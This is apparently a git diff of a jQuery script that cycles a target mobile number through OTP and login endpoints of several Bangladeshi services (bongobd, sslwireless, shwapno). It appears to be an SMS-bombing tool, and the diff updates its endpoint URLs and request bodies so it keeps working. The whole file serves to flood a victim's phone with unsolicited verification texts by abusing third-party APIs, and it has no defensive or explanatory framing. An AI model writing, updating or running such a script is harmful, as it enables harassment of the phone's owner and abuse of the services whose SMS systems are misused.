@@ -18,8 +18,8 @@ $(document).ready(() => {
                 },
                 {
                     method: 'POST',
-                    url: "http://nesco.sslwireless.com/api/v1/login",
-                    body: `'"phone_number":"${mobile}"`
+                    url: "http://robi.api.bongobd.com/api/login/send-otp",
+                    body: `'{"phone_number":"${mobile}"`
                 },
                 {
                     method: 'GET',
@@ -30,9 +30,9 @@ $(document).ready(() => {
                     url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                 },
                 {
-                    url: "https://ss.binge.buzz/otp/send/login",
+                    url: "http://nesco.sslwireless.com/api/v1/login",
                     method: "POST",
-                    body: `phone=${mobile}`
+                    body: `phone_number:${mobile}`
                 }
 
             ];
